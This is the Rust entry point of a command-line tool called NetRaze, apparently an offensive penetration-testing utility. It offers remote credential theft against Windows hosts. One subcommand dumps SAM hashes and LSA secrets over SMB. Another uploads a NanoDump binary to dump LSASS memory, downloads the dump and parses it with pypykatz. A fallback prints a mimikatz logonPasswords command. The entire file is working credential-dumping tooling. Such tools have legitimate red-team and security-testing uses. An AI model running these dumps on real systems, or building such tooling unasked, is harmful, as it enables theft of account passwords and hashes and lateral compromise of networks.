use anyhow::Result;
use clap::{Parser, Subcommand};
use netraze_app::NetRazeApp;
use netraze_config::AppConfig;
use netraze_core::ScanRequest;
use netraze_protocols::smb::{remote_lsass_dump, secrets_dump, secrets_dump_nanodump};
use std::collections::BTreeMap;
use std::path::PathBuf;
use tracing_subscriber::EnvFilter;

#[derive(Debug, Parser)]
#[command(name = "netraze", about = "CLI Rust de NetRaze")]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Debug, Subcommand)]
enum Command {
    Protocols,
    Modules,
    Plan {
        protocol: String,
        #[arg(required = true)]
        targets: Vec<String>,
        #[arg(long)]
        module: Option<String>,
    },
    /// Dump SAM hashes + LSA secrets from a remote target.
    /// Add --nanodump <binary> to use NanoDump for LSASS instead of registry.
    SecretsDump {
        target: String,
        #[arg(short, long)]
        username: String,
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        domain: Option<String>,
        /// Use NanoDump for LSASS: path to nanodump.x64.exe.
        #[arg(long)]
        nanodump: Option<PathBuf>,
        /// Where to save the LSASS .dmp (only with --nanodump).
        #[arg(long, default_value = "lsass.dmp")]
        dmp_out: PathBuf,
        /// NanoDump technique: fork, dup, snapshot, spoof-callstack…
        #[arg(long, default_value = "fork")]
        technique: String,
    },
    /// Standalone LSASS minidump via NanoDump (no SAM/registry).
    LsassDump {
        target: String,
        #[arg(short, long)]
        username: String,
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        domain: Option<String>,
        /// Path to the NanoDump binary.
        #[arg(long)]
        binary: PathBuf,
        /// Where to save the downloaded .dmp file.
        #[arg(long, default_value = "lsass.dmp")]
        output: PathBuf,
        /// NanoDump technique: fork, dup, snapshot…
        #[arg(long, default_value = "fork")]
        technique: String,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .without_time()
        .init();

    let cli = Cli::parse();
    let app = NetRazeApp::bootstrap(AppConfig::default());

    match cli.command {
        Command::Protocols => {
            for protocol in app.protocol_catalog() {
                println!(
                    "{} ({}) port {}",
                    protocol.display_name, protocol.key, protocol.default_port
                );
            }
        }
        Command::Modules => {
            for module in app.module_catalog() {
                println!("{} [{}]", module.key, module.supported_protocols.join(", "));
            }
        }
        Command::Plan {
            protocol,
            targets,
            module,
        } => {
            let plan = app
                .plan_scan(ScanRequest {
                    protocol,
                    raw_targets: targets,
                    selected_module: module,
                    options: BTreeMap::new(),
                })
                .await?;
            println!(
                "plan: protocol={} targets={} threads={} timeout={}s",
                plan.request.protocol,
                plan.request.raw_targets.len(),
                plan.concurrency,
                plan.timeout_seconds
            );
        }

        Command::SecretsDump {
            target,
            username,
            password,
            domain,
            nanodump,
            dmp_out,
            technique,
        } => {
            match nanodump {
                None => {
                    // Classic registry-based dump.
                    secrets_dump(&target, &username, &password, domain.as_deref())
                        .await
                        .map_err(|e| anyhow::anyhow!(e))?;
                }
                Some(binary_path) => {
                    // NanoDump path: SAM via registry + LSASS via NanoDump.
                    let nanodump_bytes = std::fs::read(&binary_path).map_err(|e| {
                        anyhow::anyhow!("cannot read {}: {e}", binary_path.display())
                    })?;
                    println!(
                        "[*] NanoDump binary: {} ({} bytes)",
                        binary_path.display(),
                        nanodump_bytes.len()
                    );

                    let dump_bytes = secrets_dump_nanodump(
                        &target,
                        &username,
                        &password,
                        domain.as_deref(),
                        &nanodump_bytes,
                        &technique,
                        &|line| println!("[nanodump] {line}"),
                    )
                    .await
                    .map_err(|e| anyhow::anyhow!(e))?;

                    // Save the minidump.
                    std::fs::write(&dmp_out, &dump_bytes).map_err(|e| {
                        anyhow::anyhow!("cannot write {}: {e}", dmp_out.display())
                    })?;
                    println!("[+] Minidump saved → {}", dmp_out.display());

                    // Try to auto-parse with pypykatz.
                    parse_with_pypykatz(&dmp_out);
                }
            }
        }

        Command::LsassDump {
            target,
            username,
            password,
            domain,
            binary,
            output,
            technique,
        } => {
            let nanodump_bytes = std::fs::read(&binary)
                .map_err(|e| anyhow::anyhow!("cannot read {}: {e}", binary.display()))?;
            println!(
                "[*] NanoDump binary: {} ({} bytes)",
                binary.display(),
                nanodump_bytes.len()
            );
            let cred = netraze_protocols::smb::SmbCredential::new(
                &username,
                domain.as_deref().unwrap_or(""),
                &password,
            );
            let technique_flag = format!("--{technique}");
            let result = remote_lsass_dump(
                &target,
                &cred,
                &nanodump_bytes,
                &technique_flag,
                &|line| println!("[nanodump] {line}"),
            )
            .await
            .map_err(|e| anyhow::anyhow!(e))?;

            std::fs::write(&output, &result.dump_bytes)
                .map_err(|e| anyhow::anyhow!("cannot write {}: {e}", output.display()))?;
            println!("[+] {} → {}", result.summary, output.display());
            parse_with_pypykatz(&output);
        }
    }

    Ok(())
}

/// Try to parse a minidump with pypykatz and print the output.
/// Tries the `pypykatz` command first, then `python -m pypykatz`.
/// Non-fatal: if pypykatz is unavailable, we just tell the user how to parse.
fn parse_with_pypykatz(dmp_path: &PathBuf) {
    let path_str = match dmp_path.to_str() {
        Some(s) => s.to_owned(),
        None => return,
    };

    println!("[*] Trying pypykatz auto-parse...");

    // Attempt 1: pypykatz in PATH.
    let r1 = std::process::Command::new("pypykatz")
        .args(["lsa", "minidump", &path_str])
        .output();

    if let Ok(out) = r1 {
        if out.status.success() || !out.stdout.is_empty() {
            println!("{}", String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                eprintln!("{}", String::from_utf8_lossy(&out.stderr));
            }
            return;
        }
    }

    // Attempt 2: python -m pypykatz.
    let r2 = std::process::Command::new("python")
        .args(["-m", "pypykatz", "lsa", "minidump", &path_str])
        .output();

    if let Ok(out) = r2 {
        if out.status.success() || !out.stdout.is_empty() {
            println!("{}", String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                eprintln!("{}", String::from_utf8_lossy(&out.stderr));
            }
            return;
        }
    }

    println!(
        "[!] pypykatz not found — parse manually:\n    \
         pypykatz lsa minidump {path_str}\n    \
         mimikatz.exe \"sekurlsa::minidump {path_str}\" \"sekurlsa::logonPasswords full\" exit"
    );
}
